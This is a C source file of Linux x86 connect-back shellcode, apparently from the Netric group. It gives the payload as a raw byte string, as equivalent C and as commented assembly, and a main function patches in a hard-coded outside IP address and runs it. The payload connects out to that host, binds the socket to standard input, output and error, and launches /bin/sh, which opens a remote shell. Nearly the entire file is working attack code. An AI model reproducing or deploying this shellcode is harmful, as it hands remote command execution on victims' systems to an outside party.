/* linux x86 shellcode by eSDee of Netric (www.netric.org)
 * 131 byte - connect back shellcode (port=0xb0ef)
 */

#include <stdio.h>

char
shellcode[] =
        "\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
        "\x06\x51\xb1\x01\x51\xb1\x02\x51"
        "\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
        "\x89\xc2\x31\xc0\x31\xc9\x51\x51"
        "\x68\x41\x42\x43\x44\x66\x68\xb0"
        "\xef\xb1\x02\x66\x51\x89\xe7\xb3"
        "\x10\x53\x57\x52\x89\xe1\xb3\x03"
        "\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
        "\x74\x06\x31\xc0\xb0\x01\xcd\x80"
        "\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
        "\x31\xc0\xb0\x3f\x89\xd3\xb1\x01"
        "\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
        "\xb1\x02\xcd\x80\x31\xc0\x31\xd2"
        "\x50\x68\x6e\x2f\x73\x68\x68\x2f"
        "\x2f\x62\x69\x89\xe3\x50\x53\x89"
        "\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
        "\x01\xcd\x80";

int
c_code()
{
        char *argv[2];
        char *sockaddr = "\x02\x00"             //  Address family
                         "\xef\xb0"             //  port
                         "\x00\x00\x00\x00"     //  sin_addr
                         "\x00\x00\x00\x00"
                         "\x00\x00\x00\x00";

        int sock;

        sock = socket(2, 1, 6);
        if (connect(sock, sockaddr, 16) < 0) exit();

        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);

        argv[0] = "//bin/sh";
        argv[1] = NULL;

        execve(argv[0], &argv[0], NULL);
        exit();
}

int
asm_code()
{
        __asm(" # sock = socket(2, 1, 6);
                xorl    %eax,   %eax
                xorl    %ebx,   %ebx
                xorl    %ecx,   %ecx
                pushl   %ecx
                movb    $6,     %cl             # IPPROTO_TCP
                pushl   %ecx
                movb    $1,     %cl             # SOCK_STREAM
                pushl   %ecx
                movb    $2,     %cl             # AF_INET
                pushl   %ecx
                movl    %esp,   %ecx
                movb    $1,     %bl             # SYS_SOCKET
                movb    $102,   %al             # SYS_socketcall
                int     $0x80

                # connect(sock, sockaddr, 16)
                movl    %eax,   %edx
                xorl    %eax,   %eax
                xorl    %ecx,   %ecx
                pushl   %ecx
                pushl   %ecx
                pushl   $0x44434241             # ip address
                pushw   $0xefb0                 # port
                movb    $0x02,  %cl             # address family
                pushw   %cx
                movl    %esp,   %edi
                movb    $16,    %bl             # sizeof(sockaddr)
                pushl   %ebx
                pushl   %edi
                pushl   %edx                    # sock
                movl    %esp,   %ecx
                movb    $3,     %bl             # SYS_CONNECT
                movb    $102,   %al             # SYS_socketcall
                int     $0x80
                xorl    %ecx,   %ecx
                cmpl    %eax,   %ecx
                je CONNECTED

                # exit()
                xorl    %eax,   %eax
                movb    $1,     %al             # SYS_exit
                int     $0x80

                CONNECTED:
                # dup2(sock, 0);
                xorl    %eax,   %eax
                movb    $63,    %al             # SYS_dup2
                movl    %edx,   %ebx            # sock
                int     $0x80

                # dup2(sock, 1);
                xorl    %eax,   %eax
                movb    $63,    %al             # SYS_dup2
                movl    %edx,   %ebx            # sock
                movb    $1,     %cl             # stdout
                int     $0x80

                # dup2(sock, 2);
                xorl    %eax,   %eax
                movb    $63,    %al             # SYS_dup2
                movl    %edx,   %ebx            # sock
                movb    $2,     %cl             # stderr
                int     $0x80

                # execve(argv[0], &argv[0], NULL);
                xorl    %eax,   %eax
                xorl    %edx,   %edx
                pushl   %eax
                pushl   $0x68732f6e             # the string
                pushl   $0x69622f2f             # //bin/sh
                movl    %esp,   %ebx
                pushl   %eax
                pushl   %ebx
                movl    %esp,   %ecx
                movb    $11,    %al             # SYS_execve
                int     $0x80

                # exit()
                xorl    %eax,   %eax
                movb    $1,     %al             # SYS_exit
                int     $0x80
                ");
}

int
main()
{
        void (*funct)();

        shellcode[33] = 81;     /* ip of www.netric.org :) */
        shellcode[34] = 17;
        shellcode[35] = 46;
        shellcode[36] = 156;

        (long) funct = &shellcode;
        funct();
        return 0;
}